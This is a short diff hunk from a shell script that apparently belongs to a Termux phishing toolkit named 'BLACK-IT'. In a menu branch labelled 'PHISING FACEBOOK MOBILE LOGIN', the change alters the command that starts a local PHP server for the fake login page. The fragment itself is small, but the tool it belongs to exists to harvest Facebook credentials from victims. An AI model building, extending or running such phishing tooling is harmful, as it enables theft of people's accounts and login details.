@@ -73,7 +73,7 @@ sleep 1
 echo $pur"now open new session and run Next.sh"
 echo $ku"_________________________________"
 echo $pur"  PHISING FACEBOOK MOBILE LOGIN"
-php -S localhost:8080 -t /data/data/com.termux/files/home/BLACK-IT/v2
+php -S localhost:8080 v2.php
 fi
 
 if [ $pil = 4 ]
